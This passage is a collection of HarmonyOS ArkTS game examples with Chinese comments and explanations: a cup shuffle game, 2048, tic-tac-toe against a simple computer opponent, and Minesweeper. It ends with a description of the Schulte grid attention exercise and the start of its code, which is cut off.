// 杯子之间的间距 @State animationDurationMs: number = 140; // 动画持续时间（毫秒） @State isGameAnimating: boolean = false; // 是否正在动画中 @State mixingCount: number = 5; // 每局游戏混合次数 @State currentMixingCount: number = 0; // 当前正在进行的混合次数计数 // 开始游戏的方法 startGame() { this.currentMixingCount--; // 减少混合次数 const cupPairs = [[0, 1], [0, 2], [1, 2]]; // 可能的杯子对组合 const selectedPair = cupPairs[Math.floor(Math.random() * cupPairs.length)]; // 随机选择一对 this.moveCups(selectedPair[0], selectedPair[1]); // 开始移动选定的两个杯子 } // 移动指定的两个杯子 moveCups(cupIndex1: number, cupIndex2: number) { const direction: number = Math.random() \u0026lt; 0.5 ? -1 : 1; // 随机方向 const distanceFactor: number = Math.abs(cupIndex1 - cupIndex2); // 距离因子 const adjustedDistanceFactor: number = distanceFactor === 1 ? 2 : 1; // 根据距离调整因子 animateToImmediately({ delay: 0, duration: this.animationDurationMs }, () =\u0026gt; { this.gameCups[cupIndex1].positionY = -direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor }) animateToImmediately({ delay: this.animationDurationMs, duration: this.animationDurationMs }, () =\u0026gt; { this.gameCups[cupIndex1].positionX = (this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex1].positionY = -direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor }) animateToImmediately({ delay: this.animationDurationMs * 2, duration: this.animationDurationMs }, () =\u0026gt; { this.gameCups[cupIndex1].positionX = (this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex1].positionY = 0 }) animateToImmediately({ delay: 0, duration: this.animationDurationMs }, () =\u0026gt; { this.gameCups[cupIndex2].positionY = direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor }) animateToImmediately({ delay: this.animationDurationMs, duration: this.animationDurationMs }, () =\u0026gt; { this.gameCups[cupIndex2].positionX = -(this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex2].positionY = direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor }) animateToImmediately({ delay: this.animationDurationMs * 2, duration: this.animationDurationMs, onFinish: () =\u0026gt; { this.swapBalls(cupIndex1, cupIndex2) } }, () =\u0026gt; { this.gameCups[cupIndex2].positionX = -(this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex2].positionY = 0 }) } // 重置杯子的位置 resetCupPosition(cupIndex: number) { this.gameCups[cupIndex].positionX = 0; this.gameCups[cupIndex].positionY = 0; } // 交换两个杯子内的球 swapBalls(cupIndex1: number, cupIndex2: number) { this.resetCupPosition(cupIndex1); this.resetCupPosition(cupIndex2); let temporaryBallStatus = this.gameCups[cupIndex1].containsBall; this.gameCups[cupIndex1].containsBall = this.gameCups[cupIndex2].containsBall; this.gameCups[cupIndex2].containsBall = temporaryBallStatus; if (this.currentMixingCount \u0026lt;= 0) { this.isGameAnimating = false; } else { setTimeout(() =\u0026gt; { this.startGame(); }, 10); } } // 构建游戏界面 build() { Column({ space: 20 }) { // 游戏标题 Text(\u0026#39;猜小球游戏\u0026#39;) .fontSize(24) .margin({ top: 20 }); // 动画速度控制器 Counter() { Text(`当前速度${this.animationDurationMs}毫秒`) .fontColor(Color.Black) .fontSize(\u0026#39;26lpx\u0026#39;); }.width(\u0026#39;400lpx\u0026#39;).onInc(() =\u0026gt; { this.animationDurationMs += 10; }).onDec(() =\u0026gt; { this.animationDurationMs -= 10; this.animationDurationMs = this.animationDurationMs \u0026lt; 10 ? 10 : this.animationDurationMs; }); // 混合次数控制器 Counter() { Text(`每局混合${this.mixingCount}次`) .fontColor(Color.Black) .fontSize(\u0026#39;26lpx\u0026#39;); }.width(\u0026#39;400lpx\u0026#39;).onInc(() =\u0026gt; { this.mixingCount += 1; }).onDec(() =\u0026gt; { this.mixingCount -= 1; this.mixingCount = this.mixingCount \u0026lt; 1 ? 1 : this.mixingCount }); // 杯子布局 Row() { ForEach(this.gameCups, (cup: Cup) =\u0026gt; { Text(cup.isRevealed ? (cup.containsBall ? \u0026#39;小球\u0026#39; : \u0026#39;空\u0026#39;) : \u0026#39;\u0026#39;) .width(`${this.cupWidth}lpx`) .height(`${this.cupWidth}lpx`) .margin(`${this.cupSpacing}lpx`) .backgroundColor(Color.Orange) .fontSize(`${this.cupWidth / 4}lpx`) .textAlign(TextAlign.Center) .fontColor(Color.White) .borderRadius(5) .translate({ x: `${cup.positionX}lpx`, y: `${cup.positionY}lpx` }) .onClick(() =\u0026gt; { if (!this.isGameAnimating) { cup.isRevealed = true; } }); }); }.justifyContent(FlexAlign.Center).width(\u0026#39;100%\u0026#39;).height(\u0026#39;720lpx\u0026#39;).backgroundColor(Color.Gray); // 开始游戏按钮 Button(\u0026#39;开始游戏\u0026#39;).onClick(() =\u0026gt; { if (!this.isGameAnimating) { this.currentMixingCount = this.mixingCount; this.isGameAnimating = true; this.gameCups.forEach(cup =\u0026gt; cup.isRevealed = false); this.startGame(); } }); }.width(\u0026#39;100%\u0026#39;).height(\u0026#39;100%\u0026#39;); } } 2048 // 使用装饰器标记Cell类，可能表示该类具有可观测性 @ObservedV2 class Cell { // 使用Trace装饰器标记value属性，可能表示该属性的变化会被追踪 @Trace value: number; // 构造函数初始化单元格的值为0 constructor() { this.value = 0; } } // 使用Entry和Component装饰器标记Game2048结构体，可能表示这是程序的入口点，并且该结构体定义了一个组件 @Entry @Component // 定义Game2048结构体 struct Game2048 { // 使用State装饰器标记状态变量，可能表示这些变量是组件的状态 @State board: Cell[][] = []; // 游戏盘面 @State score: number = 0; // 分数 @State cellSize: number = 200; // 单元格大小 @State cellMargin: number = 5; // 单元格之间的边距 @State screenStartX: number = 0; // 触摸开始时的屏幕X坐标 @State screenStartY: number = 0; // 触摸开始时的屏幕Y坐标 @State lastScreenX: number = 0; // 触摸结束时的屏幕X坐标 @State lastScreenY: number = 0; // 触摸结束时的屏幕Y坐标 // 定义颜色数组 colors: string[] = [ \u0026#39;#CCCCCC\u0026#39;, // 0 - 灰色 \u0026#39;#FFC107\u0026#39;, // 2 - 黄色 \u0026#39;#FF9800\u0026#39;, // 4 - 橙色 \u0026#39;#FF5722\u0026#39;, // 8 - 深橙色 \u0026#39;#F44336\u0026#39;, // 16 - 红色 \u0026#39;#9C27B0\u0026#39;, // 32 - 紫色 \u0026#39;#3F51B5\u0026#39;, // 64 - 蓝紫色 \u0026#39;#00BCD4\u0026#39;, // 128 - 蓝色 \u0026#39;#009688\u0026#39;, // 256 - 深青色 \u0026#39;#4CAF50\u0026#39;, // 512 - 绿色 \u0026#39;#8BC34A\u0026#39;, // 1024 - 浅绿色 \u0026#39;#CDDC39\u0026#39;, // 2048 - 柠檬黄 \u0026#39;#FFEB3B\u0026#39;, // 4096 - 淡黄色 \u0026#39;#795548\u0026#39;, // 8192 - 棕色 \u0026#39;#607D8B\u0026#39;, // 16384 - 深灰色 \u0026#39;#9E9E9E\u0026#39;, // 32768 - 灰色 \u0026#39;#000000\u0026#39; // 以上 - 黑色 ]; // 游戏即将出现时执行的方法 aboutToAppear() { this.score = 0; // 重置分数 this.initBoard(); // 重新初始化游戏板 this.addRandomTiles(2); // 添加两个随机方块 } // 初始化游戏盘面 initBoard() { if (this.board.length == 0) { for (let i = 0; i \u0026lt; 4; i++) { let cellArr: Cell[] = []; for (let j = 0; j \u0026lt; 4; j++) { cellArr.push(new Cell()); // 创建新单元格 } this.board.push(cellArr); // 添加到盘面 } } else { for (let i = 0; i \u0026lt; this.board.length; i++) { for (let j = 0; j \u0026lt; this.board[i].length; j++) { this.board[i][j].value = 0; // 清空单元格 } } } } // 在盘面上添加指定数量的随机方块 addRandomTiles(count: number) { let emptyCells: object[] = []; for (let row = 0; row \u0026lt; 4; row++) { for (let col = 0; col \u0026lt; 4; col++) { if (this.board[row][col].value === 0) { emptyCells.push(Object({ row: row, col: col })); // 记录空单元格位置 } } } for (let i = 0; i \u0026lt; count; i++) { if (emptyCells.length \u0026gt; 0) { let randomIndex = Math.floor(Math.random() * emptyCells.length); let obj = emptyCells[randomIndex]; this.board[obj[\u0026#39;row\u0026#39;]][obj[\u0026#39;col\u0026#39;]].value = Math.random() \u0026lt; 0.9 ? 2 : 4; // 随机生成2或4 emptyCells.splice(randomIndex, 1); // 移除已使用的空单元格位置 } } } // 向左滑动 slideLeft() { for (let row = 0; row \u0026lt; 4; row++) { let tempRow: number[] = []; // 临时存储行数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 for (let col = 0; col \u0026lt; 4; col++) { if (this.board[row][col].value !== 0) { tempRow.push(this.board[row][col].value); // 移动非零值 } } let mergePos = 0; while (mergePos \u0026lt; tempRow.length - 1) { if (tempRow[mergePos] === tempRow[mergePos + 1] \u0026amp;\u0026amp; !merged[mergePos]) { tempRow[mergePos] *= 2; // 合并 this.score += tempRow[mergePos]; // 更新分数 merged[mergePos] = true; // 标记已合并 tempRow.splice(mergePos + 1, 1); // 移除合并过的值 } else { mergePos++; } } while (tempRow.length \u0026lt; 4) { tempRow.push(0); // 填充空位 } for (let col = 0; col \u0026lt; 4; col++) { this.board[row][col].value = tempRow[col]; // 更新盘面 } } } // 向右滑动 slideRight() { for (let row = 0; row \u0026lt; 4; row++) { let tempRow: number[] = []; // 临时存储行数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 for (let col = 3; col \u0026gt;= 0; col--) { if (this.board[row][col].value !== 0) { tempRow.unshift(this.board[row][col].value); // 移动非零值 } } let mergePos = tempRow.length - 1; while (mergePos \u0026gt; 0) { if (tempRow[mergePos] === tempRow[mergePos - 1] \u0026amp;\u0026amp; !merged[mergePos - 1]) { tempRow[mergePos] *= 2; // 合并 this.score += tempRow[mergePos]; // 更新分数 merged[mergePos - 1] = true; // 标记已合并 tempRow.splice(mergePos - 1, 1); // 移除合并过的值 } else { mergePos--; } } while (tempRow.length \u0026lt; 4) { tempRow.unshift(0); // 填充空位 } for (let col = 0; col \u0026lt; 4; col++) { this.board[row][col].value = tempRow[col]; // 更新盘面 } } } // 向上滑动 slideUp() { for (let col = 0; col \u0026lt; 4; col++) { let tempCol: number[] = []; // 临时存储列数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 for (let row = 0; row \u0026lt; 4; row++) { if (this.board[row][col].value !== 0) { tempCol.push(this.board[row][col].value); // 移动非零值 } } let mergePos = 0; while (mergePos \u0026lt; tempCol.length - 1) { if (tempCol[mergePos] === tempCol[mergePos + 1] \u0026amp;\u0026amp; !merged[mergePos]) { tempCol[mergePos] *= 2; // 合并 this.score += tempCol[mergePos]; // 更新分数 merged[mergePos] = true; // 标记已合并 tempCol.splice(mergePos + 1, 1); // 移除合并过的值 } else { mergePos++; } } while (tempCol.length \u0026lt; 4) { tempCol.push(0); // 填充空位 } for (let newRow = 0; newRow \u0026lt; 4; newRow++) { this.board[newRow][col].value = tempCol[newRow]; // 更新盘面 } } } // 向下滑动 slideDown() { for (let col = 0; col \u0026lt; 4; col++) { let tempCol: number[] = []; // 临时存储列数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 // 从下往上遍历列 for (let row = 3; row \u0026gt;= 0; row--) { if (this.board[row][col].value !== 0) { tempCol.unshift(this.board[row][col].value); // 移动非零值 } } let mergePos = tempCol.length - 1; while (mergePos \u0026gt; 0) { if (tempCol[mergePos] === tempCol[mergePos - 1] \u0026amp;\u0026amp; !merged[mergePos - 1]) { tempCol[mergePos] *= 2; // 合并 this.score += tempCol[mergePos]; // 更新分数 merged[mergePos - 1] = true; // 标记已合并 tempCol.splice(mergePos - 1, 1); // 移除合并过的值 } else { mergePos--; } } // 如果数组长度小于4，用0填充 while (tempCol.length \u0026lt; 4) { tempCol.unshift(0); // 填充空位 } // 将处理后的数组元素放回到棋盘的对应列中 for (let row = 0; row \u0026lt; 4; row++) { this.board[3 - row][col].value = tempCol[3 - row]; // 注意反转顺序 } } } // 构建游戏界面 build() { // 布局容器 Column({ space: 10 }) { // 显示得分 Text(`得分: ${this.score}`) .fontSize(24) .margin({ top: 20 }) // 底层背景布局 Flex({ wrap: FlexWrap.Wrap, direction: FlexDirection.Row }) { // 遍历每个单元格 ForEach(this.board.flat(), (cell: Cell, index: number) =\u0026gt; { // 显示单元格上的数字 Text(`${cell.value || \u0026#39;\u0026#39;}`) .width(`${this.cellSize}px`) .height(`${this.cellSize}px`) .margin(`${this.cellMargin}px`) .fontSize(`${cell.value \u0026gt;= 100 ? this.cellSize / 3 : this.cellSize / 2}px`) // 根据数字大小调整字体大小 .textAlign(TextAlign.Center) .backgroundColor(this.colors[cell.value == 0?0:Math.floor(Math.log2(cell.value))]) // 设置背景颜色 .fontColor(cell.value === 0 ? \u0026#39;#000\u0026#39; : \u0026#39;#fff\u0026#39;) // 设置字体颜色 .borderRadius(5) // 圆角 }) } .width(`${(this.cellSize + this.cellMargin * 2) * 4}px`) // 设置容器宽度 // 重新开始按钮 Button(\u0026#39;重新开始\u0026#39;).onClick(() =\u0026gt; { this.aboutToAppear(); // 重新开始游戏 }) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .onTouch((e) =\u0026gt; { if (e.type === TouchType.Down \u0026amp;\u0026amp; e.touches.length \u0026gt; 0) { // 触摸开始，记录初始位置 this.screenStartX = e.touches[0].x; this.screenStartY = e.touches[0].y; } else if (e.type === TouchType.Up \u0026amp;\u0026amp; e.changedTouches.length \u0026gt; 0) { // 当手指抬起时，更新最后的位置 this.lastScreenX = e.changedTouches[0].x; this.lastScreenY = e.changedTouches[0].y; } }) .gesture( SwipeGesture({ direction: SwipeDirection.All }) // 支持方向中 all可以是上下左右 .onAction((_event: GestureEvent) =\u0026gt; { const swipeX = this.lastScreenX - this.screenStartX; const swipeY = this.lastScreenY - this.screenStartY; // 清除开始位置记录，准备下一次滑动判断 this.screenStartX = 0; this.screenStartY = 0; if (Math.abs(swipeX) \u0026gt; Math.abs(swipeY)) { if (swipeX \u0026gt; 0) { this.slideRight(); // 向右滑动 } else { this.slideLeft(); // 向左滑动 } } else { if (swipeY \u0026gt; 0) { this.slideDown(); // 向下滑动 } else { this.slideUp(); // 向上滑动 } } this.addRandomTiles(1); // 添加一个随机方块 }) ) } } X✔ import { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; const winningLines = [ [0, 0, 0, 1, 0, 2], // Horizontal 1 [1, 0, 1, 1, 1, 2], // Horizontal 2 [2, 0, 2, 1, 2, 2], // Horizontal 3 [0, 0, 1, 0, 2, 0], // Vertical 1 [0, 1, 1, 1, 2, 1], // Vertical 2 [0, 2, 1, 2, 2, 2], // Vertical 3 [0, 0, 1, 1, 2, 2], // Diagonal \\ [0, 2, 1, 1, 2, 0]// Diagonal / ]; @ObservedV2 class GridCell { @Trace value: string = \u0026#34;\u0026#34;; // 当前格子的值 rowIndex: number = 0; // 格子所在的行号 colIndex: number = 0; // 格子所在的列号 constructor(rowIndex: number, colIndex: number) { this.rowIndex = rowIndex; this.colIndex = colIndex; } } @Entry @Component struct TicTacToe { @State board: GridCell[][] = []; // 游戏板 @State currentPlayer: string = \u0026#39;X\u0026#39;; // 当前玩家 @State isGameOver: boolean = false; // 游戏是否结束 @State winner: string = \u0026#39;\u0026#39;; // 获胜者 @State cellSize: number = 120; // 单元格大小 @State cellMargin: number = 5; // 单元格边距 // 组件即将出现时初始化游戏 aboutToAppear(): void { this.board = [ [new GridCell(0, 0), new GridCell(0, 1), new GridCell(0, 2)], [new GridCell(1, 0), new GridCell(1, 1), new GridCell(1, 2)], [new GridCell(2, 0), new GridCell(2, 1), new GridCell(2, 2)] ]; this.initGame(); // 初始化游戏状态 } // 重置游戏状态 initGame() { for (let i = 0; i \u0026lt; 3; i++) { for (let j = 0; j \u0026lt; 3; j++) { this.board[i][j].value = \u0026#39;\u0026#39;; // 清空所有单元格 } } this.currentPlayer = \u0026#39;X\u0026#39;; // 设置当前玩家为X this.isGameOver = false; // 游戏未结束 this.winner = \u0026#39;\u0026#39;; // 无获胜者 } // 检查是否有玩家获胜 checkForWinner() { for (let line of winningLines) { // 遍历所有胜利线路 const mark = this.board[line[0]][line[1]].value; if (mark \u0026amp;\u0026amp; // 如果有标记 mark === this.board[line[2]][line[3]].value \u0026amp;\u0026amp; // 并且等于同一行的下一个标记 mark === this.board[line[4]][line[5]].value) { // 再次等于同一行的下一个标记 this.isGameOver = true; // 游戏结束 this.winner = mark; // 设置获胜者 return mark; // 返回获胜者的标记 } } const allCellsFilled = this.board.flat().every(cell =\u0026gt; cell.value !== \u0026#39;\u0026#39;); // 检查所有单元格是否已填满 if (allCellsFilled) { this.isGameOver = true; // 游戏结束 this.winner = \u0026#39;平局\u0026#39;; // 设置为平局 return \u0026#39;平局\u0026#39;; // 返回平局标识 } return \u0026#39;\u0026#39;; // 无获胜者 } // 玩家落子 placeMark(rowIndex: number, colIndex: number) { if (!this.isGameOver \u0026amp;\u0026amp; this.board[rowIndex][colIndex].value === \u0026#39;\u0026#39;) { // 如果游戏未结束且单元格为空 this.board[rowIndex][colIndex].value = this.currentPlayer; // 放置标记 const result = this.checkForWinner(); // 检查是否有获胜者 if (result) { // 如果有获胜者 console.info(`${result} 获胜！`); let message = `${result} 获胜！`; // 设置提示信息 if (result === \u0026#39;平局\u0026#39;) { message = \u0026#39;平局！\u0026#39;; // 如果是平局 } promptAction.showDialog({ // 显示对话框 title: `游戏结束`, // 标题 message, // 提示信息 buttons: [ // 按钮 { text: \u0026#39;重新开始\u0026#39;, // 文本 color: \u0026#39;#ffa500\u0026#39; // 颜色 } ], }).then(() =\u0026gt; { this.initGame(); // 重新开始游戏 }); } else { // 如果没有获胜者 this.currentPlayer = this.currentPlayer === \u0026#39;X\u0026#39; ? \u0026#39;O\u0026#39; : \u0026#39;X\u0026#39;; // 切换玩家 if (this.currentPlayer === \u0026#39;O\u0026#39;) { // 如果是AI玩家 this.aiMove(); // AI落子 } } } } // AI落子 aiMove() { let moveFound = false; let bestMove: null | number[] = null; // 寻找最佳落子位置 bestMove = this.findWinningMove(\u0026#39;O\u0026#39;); // 检查AI是否有胜利机会 console.info(`bestMove a:${JSON.stringify(bestMove)}`); if (bestMove) { moveFound = true; } else { bestMove = this.findWinningMove(\u0026#39;X\u0026#39;); // 检查玩家是否有胜利机会 console.info(`bestMove b:${JSON.stringify(bestMove)}`); if (bestMove) { moveFound = true; } else { bestMove = this.findRandomMove(); // 随机落子 console.info(`bestMove c:${JSON.stringify(bestMove)}`); if (bestMove) { moveFound = true; } } } if (moveFound \u0026amp;\u0026amp; bestMove) { // 如果找到了合适的落子位置 console.info(`bestMove:${JSON.stringify(bestMove)}`); this.placeMark(bestMove[0], bestMove[1]); // 落子 } } // 寻找给定玩家是否有机会赢，并返回这样的移动位置 findWinningMove(player: string) { for (let line of winningLines) { // 遍历所有胜利线路 let missingIndex = -1; let noEmptyCount = 0; for (let i = 0; i \u0026lt; line.length; i += 2) { // 检查每个单元格 if (this.board[line[i]][line[i + 1]].value === player) { // 如果是该玩家的标记 noEmptyCount++; // 计数 } else if (this.board[line[i]][line[i + 1]].value === \u0026#39;\u0026#39;) { // 如果为空 missingIndex = i; // 记录空格位置 } } if (noEmptyCount === 2 \u0026amp;\u0026amp; missingIndex != -1) { // 如果有两个标记且有一个空格 return [line[missingIndex], line[missingIndex + 1]]; // 返回空格位置 } } return null; // 未找到合适位置 } // 寻找一个随机的合法落子位置 findRandomMove() { let emptyCells: number[][] = []; // 存储空格位置 for (let i = 0; i \u0026lt; 3; i++) { for (let j = 0; j \u0026lt; 3; j++) { if (this.board[i][j].value === \u0026#39;\u0026#39;) { // 如果单元格为空 emptyCells.push([i, j]); // 添加到空格列表 } } } if (emptyCells.length \u0026gt; 0) { // 如果有空格 return emptyCells[Math.floor(Math.random() * emptyCells.length)]; // 随机选择一个空格 } return null; // 未找到空格 } // 构建游戏界面 build() { Column({ space: 20 }) { // 创建主列布局 Flex({ wrap: FlexWrap.Wrap }) { // 创建主行布局 ForEach(this.board, (row: GridCell[], _index: number) =\u0026gt; { // 遍历每一行 ForEach(row, (cell: GridCell, _index: number) =\u0026gt; { // 遍历每一个单元格 Text(cell.value) // 显示单元格内的文本 .width(`${this.cellSize}lpx`) // 设置宽度 .height(`${this.cellSize}lpx`) // 设置高度 .margin(`${this.cellMargin}lpx`) // 设置边距 .fontSize(`${this.cellSize / 2}lpx`) // 设置字体大小 .textAlign(TextAlign.Center) // 居中文本 .backgroundColor(cell.value === \u0026#39;X\u0026#39; ? Color.Red : // 设置背景颜色 cell.value === \u0026#39;O\u0026#39; ? Color.Blue : Color.Gray) .fontColor(Color.White) // 设置字体颜色 .borderRadius(5) // 设置圆角 .onClick(() =\u0026gt; { // 点击事件 this.placeMark(cell.rowIndex, cell.colIndex); // 落子 }); }) }) } .width(`${(this.cellSize + this.cellMargin * 2) * 3}lpx`) // 设置宽度 Button(\u0026#39;重新开始\u0026#39;) // 重新开始按钮 .width(\u0026#39;50%\u0026#39;) // 设置宽度 .height(\u0026#39;10%\u0026#39;) // 设置高度 .onClick(() =\u0026gt; { // 点击事件 this.initGame(); // 重新开始游戏 }); } .width(\u0026#39;100%\u0026#39;) // 设置宽度 .height(\u0026#39;100%\u0026#39;); // 设置高度 } } mine 扫雷\n实现步骤\n步骤1：定义游戏状态\n首先，我们需要定义游戏的状态变量，包括游戏面板数据、地雷数量、已揭示方块集合、标记为地雷的方块集合等。\n步骤2：初始化游戏\n在组件即将显示时初始化游戏，包括清空状态变量、生成游戏面板、放置地雷等。\n步骤3：生成游戏面板与放置地雷\n游戏面板由10x10的方块组成，随机放置10个地雷，并计算每个方块周围的地雷数量。\n步骤4：处理用户交互\n用户可以通过点击方块来揭示其内容，也可以通过长按来标记地雷。\n步骤5：显示游戏结果\n当玩家揭示到地雷时，游戏结束；当所有非雷方块都被揭示时，游戏胜利。\n步骤6：定义Cell类\n最后，定义一个Cell类来存储每个方块的信息。\nimport { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; @Entry @Component struct MineSweeper { // 游戏面板数据 @State private gameBoard: Cell[][] = []; // 地雷总数 @State private mineCount: number = 10; // 已经揭示的方块集合 @State private revealedCells: Set\u0026lt;string\u0026gt; = new Set(); // 标记为地雷的方块集合 @State private flaggedCells: Set\u0026lt;string\u0026gt; = new Set(); // 方块大小 @State private cellSize: number = 60; // 方块之间的边距 @State private cellMargin: number = 2; // 游戏开始时间 private startTime: number = Date.now(); // 游戏结束标志 @State private isGameOver: boolean = false; // 在组件即将显示时初始化游戏 aboutToAppear(): void { this.initializeGame(); } // 初始化游戏 private initializeGame() { this.isGameOver = false; this.startTime = Date.now(); this.revealedCells.clear(); this.flaggedCells.clear(); this.generateBoard(); } // 生成游戏面板 private generateBoard() { this.gameBoard = []; for (let i = 0; i \u0026lt; 10; i++) { this.gameBoard.push([]); for (let j = 0; j \u0026lt; 10; j++) { this.gameBoard[i].push(new Cell(i, j)); } } this.placeMines(); this.calculateNumbers(); } // 随机放置地雷 private placeMines() { let placed = 0; while (placed \u0026lt; this.mineCount) { let x = Math.floor(Math.random() * 10); let y = Math.floor(Math.random() * 10); if (!this.gameBoard[x][y].hasMine) { this.gameBoard[x][y].hasMine = true; placed++; } } } // 计算每个方块周围的地雷数量 private calculateNumbers() { for (let i = 0; i \u0026lt; 10; i++) { for (let j = 0; j \u0026lt; 10; j++) { if (!this.gameBoard[i][j].hasMine) { this.gameBoard[i][j].neighborMines = this.countNeighborMines(i, j); this.gameBoard[i][j].value = this.gameBoard[i][j].neighborMines.toString(); } else { this.gameBoard[i][j].value = \u0026#39;雷\u0026#39;; } } } } // 计算给定坐标周围地雷的数量 private countNeighborMines(row: number, col: number): number { let count = 0; for (let dx = -1; dx \u0026lt;= 1; dx++) { for (let dy = -1; dy \u0026lt;= 1; dy++) { if (dx === 0 \u0026amp;\u0026amp; dy === 0) { continue; } let newRow = row + dx, newCol = col + dy; if (newRow \u0026gt;= 0 \u0026amp;\u0026amp; newRow \u0026lt; 10 \u0026amp;\u0026amp; newCol \u0026gt;= 0 \u0026amp;\u0026amp; newCol \u0026lt; 10 \u0026amp;\u0026amp; this.gameBoard[newRow][newCol].hasMine) { count++; } } } return count; } // 揭示方块 private revealCell(row: number, col: number) { if (this.isGameOver || this.revealedCells.has(`${row},${col}`)) { return; } const key = `${row},${col}`; this.revealedCells.add(key); if (this.gameBoard[row][col].hasMine) { this.showGameOverDialog(); } else { if (this.gameBoard[row][col].neighborMines === 0) { for (let dx = -1; dx \u0026lt;= 1; dx++) { for (let dy = -1; dy \u0026lt;= 1; dy++) { if (dx === 0 \u0026amp;\u0026amp; dy === 0) { continue; } let newRow = row + dx, newCol = col + dy; if (newRow \u0026gt;= 0 \u0026amp;\u0026amp; newRow \u0026lt; 10 \u0026amp;\u0026amp; newCol \u0026gt;= 0 \u0026amp;\u0026amp; newCol \u0026lt; 10) { this.revealCell(newRow, newCol); } } } } } if (this.isVictory()) { this.showVictoryDialog(); } } // 显示游戏结束对话框 private showGameOverDialog() { this.isGameOver = true; promptAction.showDialog({ title: \u0026#39;游戏结束: 游戏失败！\u0026#39;, buttons: [{ text: \u0026#39;重新开始\u0026#39;, color: \u0026#39;#ffa500\u0026#39; }] }).then(() =\u0026gt; { this.initializeGame(); }); } // 显示胜利对话框 private showVictoryDialog() { this.isGameOver = true; promptAction.showDialog({ title: \u0026#39;恭喜你，游戏胜利！\u0026#39;, message: `用时：${((Date.now() - this.startTime) / 1000).toFixed(3)}秒`, buttons: [{ text: \u0026#39;重新开始\u0026#39;, color: \u0026#39;#ffa500\u0026#39; }] }).then(() =\u0026gt; { this.initializeGame(); }); } // 判断游戏是否胜利 private isVictory() { let revealedNonMineCount = 0; for (let i = 0; i \u0026lt; this.gameBoard.length; i++) { for (let j = 0; j \u0026lt; this.gameBoard[i].length; j++) { if (this.revealedCells.has(`${i},${j}`)) { revealedNonMineCount++; } } } return revealedNonMineCount == 90; } // 决定是否显示方块值 private isShowValue(cell: Cell): string { if (this.isGameOver) { return cell.value === \u0026#39;0\u0026#39; ? \u0026#39;\u0026#39; : cell.value; } else { if (this.revealedCells.has(`${cell.row},${cell.column}`)) { return cell.value === \u0026#39;0\u0026#39; ? \u0026#39;\u0026#39; : cell.value; } else { return \u0026#39;\u0026#39;; } } } build() { Column({ space: 10 }) { // 重置游戏按钮 Button(\u0026#39;重新开始\u0026#39;).onClick(() =\u0026gt; this.initializeGame()); // 创建游戏面板容器 Flex({ wrap: FlexWrap.Wrap }) { // 遍历每一行 ForEach(this.gameBoard, (row: Cell[], rowIndex: number) =\u0026gt; { // 遍历每一列 ForEach(row, (cell: Cell, colIndex: number) =\u0026gt; { Stack() { // 显示方块上的数字或雷 Text(this.isShowValue(cell)) .width(`${this.cellSize}lpx`) .height(`${this.cellSize}lpx`) .margin(`${this.cellMargin}lpx`) .fontSize(`${this.cellSize / 2}lpx`) .textAlign(TextAlign.Center) .backgroundColor(this.revealedCells.has(`${rowIndex},${colIndex}`) ? (this.isShowValue(cell) === \u0026#39;雷\u0026#39; ? Color.Red : Color.White) : Color.Gray) .fontColor(!this.revealedCells.has(`${rowIndex},${colIndex}`) || this.isShowValue(cell) === \u0026#39;雷\u0026#39; ? Color.White : Color.Black) .borderRadius(5) .parallelGesture(GestureGroup(GestureMode.Exclusive, TapGesture({ count: 1, fingers: 1 }) .onAction(() =\u0026gt; this.revealCell(rowIndex, colIndex)), LongPressGesture({ repeat: true }) .onAction(() =\u0026gt; cell.isFlag = true) )); // 显示标记旗帜 Text(`${!this.revealedCells.has(`${rowIndex},${colIndex}`) ? \u0026#39;旗\u0026#39; : \u0026#39;\u0026#39;}`) .width(`${this.cellSize}lpx`) .height(`${this.cellSize}lpx`) .margin(`${this.cellMargin}lpx`) .fontSize(`${this.cellSize / 2}lpx`) .textAlign(TextAlign.Center) .fontColor(Color.White) .visibility(cell.isFlag \u0026amp;\u0026amp; !this.isGameOver ? Visibility.Visible : Visibility.None) .onClick(() =\u0026gt; { cell.isFlag = false; }) } }); }); } .width(`${(this.cellSize + this.cellMargin * 2) * 10}lpx`); } .backgroundColor(Color.Orange) .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;); } } // 方块类 @ObservedV2 class Cell { // 方块所在的行 row: number; // 方块所在的列 column: number; // 是否有地雷 hasMine: boolean = false; // 周围地雷数量 neighborMines: number = 0; // 是否被标记为地雷 @Trace isFlag: boolean = false; // 方块值 @Trace value: string; // 构造函数 constructor(row: number, column: number) { this.row = row; this.column = column; this.value = \u0026#39;\u0026#39;; } } Schrulte Grid 舒尔特方格（Schrulte Grid），也被称为舒尔特表或舒尔特图表，是一种用于训练注意力、视觉搜索速度和广度的简单而有效的工具。它通常由一个5x5的方格组成，每个小格子里随机填写了1到25的数字。训练者需要尽快地按照数字顺序找出这些数字，并用手指指出或说出它们的位置。\n这种练习可以帮助提高眼睛的移动速度、扩大视野范围、增强大脑的反应速度和专注力，因此常被用来作为儿童和成人的注意力训练方法之一。此外，它也被一些专业领域（如飞行员、运动员等）用来提升快速信息处理能力和决策效率。\n进行舒尔特方格训练时，建议：\n保持正确的姿势，确保光线充足。 眼睛与纸面保持适当距离，一般为30-40厘米。 尽量不要用手指直接指着数字，以锻炼眼睛的移动能力。 随着熟练程度的提高，可以尝试更复杂或更大的方格，比如6x6或7x7。 定期练习，但也要注意休息，避免过度疲劳。 舒尔特方格不仅是一个简单的游戏，也是一个实用的认知训练工具，对于改善注意力集中度和个人效率有着积极的作用。\nimport { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; @Entry @Component struct Index { @State numbers: number[] = []; @State currentIndex: number = 0; //用于判断用户点击是否正确 @State timeStart: number = 0; @State widthItem: number = 120 @State marginItem: 